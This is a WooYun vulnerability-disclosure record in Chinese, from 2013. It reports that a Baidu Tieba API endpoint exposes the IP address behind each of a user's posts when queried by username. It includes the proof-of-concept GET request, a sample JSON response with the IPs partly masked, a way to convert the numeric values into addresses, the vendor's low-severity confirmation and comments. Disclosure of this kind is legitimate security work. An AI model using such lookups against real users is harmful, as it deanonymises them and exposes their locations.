{"id": 7005, "wybug_id": "wooyun-2013-043277", "wybug_title": "百度贴吧发贴IP任意查询漏洞", "wybug_corp": "百度", "wybug_author": "残影小L", "wybug_date": "2013-11-19 12:06", "wybug_open_date": "2014-01-03 12:07", "wybug_type": "敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "9", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["用户敏感信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-03：\t细节向公众公开  简要描述： 泄露用户IP的入口，百度那里属最多，这是其中一个。只要没有被单一条件限制，是任意查询。已经反馈给百度贴吧运营方，估计已经转至百度贴吧cafe，为甚还是不修复 详细说明：  新版的“贴吧个人主页”（代号：ihome,URL：http://tieba.baidu.com/home/get/getthread?un=&pn=1&ie=utf-8)读取近期贴子数据的接口存在数据泄露填充待查询目标的ID(URL中，填充un=目标用户名)，得到json数据其中，含有贴子对应的数据ip   漏洞证明：  HTTP GEThttp://tieba.baidu.com/home/get/getthread?un=%E5%B0%81%E5%AF%92%E6%B1%9F&pn=1&ie=utf-8得到json\nthread_list:[{\"forum_id\":\"280050\",\"thread_id\":\"2712018029\",\"post_id\":\"41851483972\",\"is_thread\":\"0\",\"create_time\":\"1384767709\",\"forum_name\":\"lol\",\"title\":\"\\u56de\\u590d\\uff1a\\u3010\\u798f\\u5229\\u3011LOL\\u5427\\u4f1a\\u5458\\u4e13\\u5c5e\\u798f\\u5229\\u5347\\u7ea7\\uff0c\\u6781\\u54c1\\u5927\\u5956\\u4eba\\u4eba\\u6709\\u4efd\\u9001\\u4e0d\\u505c\\uff01\",\"content\":\"\\u652f\\u6301\",\"user_name\":\"\\u5c01\\u5bd2\\u6c5f\",\"ip\":15xxx01694,\"is_post_deleted\":0,\"ptype\":0,\"last_reply_time\":\"17:41\",\"abstract\":null,\"media\":null},{\"forum_id\":\"3971990\",\"thread_id\":\"2711291181\",\"post_id\":\"41851267806\",\"is_thread\":\"0\",\"create_time\":\"1384767305\",\"forum_name\":\"\\u5427\\u4e3b\\u4e13\\u533a\",\"title\":\"\\u56de\\u590d\\uff1a\\u5bf9\\u4e8e\\u6302\\u540d\\u5427\\u4e3b\\u4f60\\u600e\\u4e48\\u770b\\u3001\\u6709\\u4ec0\\u4e48\\u529e\\u6cd5\\u6295\\u8bc9\\uff1f\",\"content\":\"\\u5427\\u4e3b\\u6ca1\\u6709\\u8fdd\\u53cd\\u8d34\\u5427\\u534f\\u8bae\\u7684\\u884c\\u4e3a\\u662f\\u65e0\\u6cd5\\u64a4\\u9500\\u5427\\u4e3b\\u6743\\u9650\\u7684\",\"user_name\":\"\\u5c01\\u5bd2\\u6c5f\",\"ip\":1517xx1694,\"is_post_deleted\":0,\"ptype\":0,\"last_reply_time\":\"17:35\",\"abstract\":null,\"media\":null}]\n解析为object，得到ip参数\n\n将得来的ip数值直接ping，将结果倒序排列（即：127.0.0.1变为1.0.0.127）得到用户IP   修复方案：  抹去此ip参数抹去其他所有页面可能提供的ip参数确保用户的ip只属于用户自己（本身，储存用户每一贴ip就显得....@贴吧技术部请一定优化用户体验，贴吧的用户体验好久没上台阶了。   版权声明：转载请注明来源 残影小L@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2013-11-19 21:01 厂商回复： 感谢对百度安全的关注，安全组尽快联系业务部门处理此问题。--“百度，因你更安全” 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-19 12:12 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 承接:钻井，架工，木工，电工，水暖工，力...)\t\t \n  洞主钟情与贴吧啊    \n     2013-11-19 17:56 |    \t\t熊猫 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:33        | panda)\t\t \n  诶呀    \n     2013-11-19 19:06 |    \t\t丢小丢 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 爱好，只是单纯的爱好)\t\t \n  那一个方法？图片贴回帖？个人信息页？    \n     2013-11-20 19:49 |    \t\t残影小L \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:3        | 我还是我。)\t\t \n  高效率，谢谢百度官方。    \n     2013-11-21 21:12 |    \t\t残影小L \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:3        | 我还是我。)\t\t \n  @丢小丢 个人信息。    \n     2013-11-22 21:18 |    \t\tdtc \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 业余技术爱好者，来乌云学习。)\t\t \n  orz    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}